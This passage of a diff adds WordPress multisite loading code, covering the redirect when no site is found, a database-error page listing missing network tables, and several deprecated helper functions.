+		 * Fires when a network can be determined but a site cannot.
+		 *
+		 * At the time of this action, the only recourse is to redirect somewhere
+		 * and exit. If you want to declare a particular site, do so earlier.
+		 *
+		 * @since 3.9.0
+		 *
+		 * @param WP_Network $current_site The network that had been determined.
+		 * @param string     $domain       The domain used to search for a site.
+		 * @param string     $path         The path used to search for a site.
+		 */
+		do_action( 'ms_site_not_found', $current_site, $domain, $path );
+
+		if ( $subdomain && ! defined( 'NOBLOGREDIRECT' ) ) {
+			// For a "subdomain" installation, redirect to the signup form specifically.
+			$destination .= 'wp-signup.php?new=' . str_replace( '.' . $current_site->domain, '', $domain );
+		} elseif ( $subdomain ) {
+			/*
+			 * For a "subdomain" installation, the NOBLOGREDIRECT constant
+			 * can be used to avoid a redirect to the signup form.
+			 * Using the ms_site_not_found action is preferred to the constant.
+			 */
+			if ( '%siteurl%' !== NOBLOGREDIRECT ) {
+				$destination = NOBLOGREDIRECT;
+			}
+		} elseif ( 0 === strcasecmp( $current_site->domain, $domain ) ) {
+			/*
+			 * If the domain we were searching for matches the network's domain,
+			 * it's no use redirecting back to ourselves -- it'll cause a loop.
+			 * As we couldn't find a site, we're simply not installed.
+			 */
+			return false;
+		}
+
+		return $destination;
+	}
+
+	// Figure out the current network's main site.
+	if ( empty( $current_site->blog_id ) ) {
+		$current_site->blog_id = get_main_site_id( $current_site->id );
+	}
+
+	return true;
+}
+
+/**
+ * Displays a failure message.
+ *
+ * Used when a blog's tables do not exist. Checks for a missing $wpdb->site table as well.
+ *
+ * @access private
+ * @since 3.0.0
+ * @since 4.4.0 The `$domain` and `$path` parameters were added.
+ *
+ * @global wpdb $wpdb WordPress database abstraction object.
+ *
+ * @param string $domain The requested domain for the error to reference.
+ * @param string $path   The requested path for the error to reference.
+ */
+function ms_not_installed( $domain, $path ) {
+	global $wpdb;
+
+	if ( ! is_admin() ) {
+		dead_db();
+	}
+
+	wp_load_translations_early();
+
+	$title = __( 'Error establishing a database connection' );
+
+	$msg   = '<h1>' . $title . '</h1>';
+	$msg  .= '<p>' . __( 'If your site does not display, please contact the owner of this network.' ) . '';
+	$msg  .= ' ' . __( 'If you are the owner of this network please check that MySQL is running properly and all tables are error free.' ) . '</p>';
+	$query = $wpdb->prepare( 'SHOW TABLES LIKE %s', $wpdb->esc_like( $wpdb->site ) );
+	if ( ! $wpdb->get_var( $query ) ) {
+		$msg .= '<p>' . sprintf(
+			/* translators: %s: Table name. */
+			__( '<strong>Database tables are missing.</strong> This means that MySQL is not running, WordPress was not installed properly, or someone deleted %s. You really should look at your database now.' ),
+			'<code>' . $wpdb->site . '</code>'
+		) . '</p>';
+	} else {
+		$msg .= '<p>' . sprintf(
+			/* translators: 1: Site URL, 2: Table name, 3: Database name. */
+			__( '<strong>Could not find site %1$s.</strong> Searched for table %2$s in database %3$s. Is that right?' ),
+			'<code>' . rtrim( $domain . $path, '/' ) . '</code>',
+			'<code>' . $wpdb->blogs . '</code>',
+			'<code>' . DB_NAME . '</code>'
+		) . '</p>';
+	}
+	$msg .= '<p><strong>' . __( 'What do I do now?' ) . '</strong> ';
+	$msg .= sprintf(
+		/* translators: %s: Documentation URL. */
+		__( 'Read the <a href="%s" target="_blank">Debugging a WordPress Network</a> article. Some of the suggestions there may help you figure out what went wrong.' ),
+		__( 'https://wordpress.org/support/article/debugging-a-wordpress-network/' )
+	);
+	$msg .= ' ' . __( 'If you&#8217;re still stuck with this message, then check that your database contains the following tables:' ) . '</p><ul>';
+	foreach ( $wpdb->tables( 'global' ) as $t => $table ) {
+		if ( 'sitecategories' === $t ) {
+			continue;
+		}
+		$msg .= '<li>' . $table . '</li>';
+	}
+	$msg .= '</ul>';
+
+	wp_die( $msg, $title, array( 'response' => 500 ) );
+}
+
+/**
+ * This deprecated function formerly set the site_name property of the $current_site object.
+ *
+ * This function simply returns the object, as before.
+ * The bootstrap takes care of setting site_name.
+ *
+ * @access private
+ * @since 3.0.0
+ * @deprecated 3.9.0 Use get_current_site() instead.
+ *
+ * @param WP_Network $current_site
+ * @return WP_Network
+ */
+function get_current_site_name( $current_site ) {
+	_deprecated_function( __FUNCTION__, '3.9.0', 'get_current_site()' );
+	return $current_site;
+}
+
+/**
+ * This deprecated function managed much of the site and network loading in multisite.
+ *
+ * The current bootstrap code is now responsible for parsing the site and network load as
+ * well as setting the global $current_site object.
+ *
+ * @access private
+ * @since 3.0.0
+ * @deprecated 3.9.0
+ *
+ * @global WP_Network $current_site
+ *
+ * @return WP_Network
+ */
+function wpmu_current_site() {
+	global $current_site;
+	_deprecated_function( __FUNCTION__, '3.9.0' );
+	return $current_site;
+}
+
+/**
+ * Retrieve an object containing information about the requested network.
+ *
+ * @since 3.9.0
+ * @deprecated 4.7.0 Use `get_network()`
+ * @see get_network()
+ *
+ * @internal In 4.6.0, converted to use get_network()
+ *
+ * @param object|int $network The network's database row or ID.
+ * @return WP_Network|false Object containing network information if found, false if not.
+ */
+function wp_get_network( $network ) {
+	_deprecated_function( __FUNCTION__, '4.7.0', 'get_network()' );
+
+	$network = get_network( $network );
+	if ( null === $network ) {
+		return false;
+	}
+
+	return $network;
+}
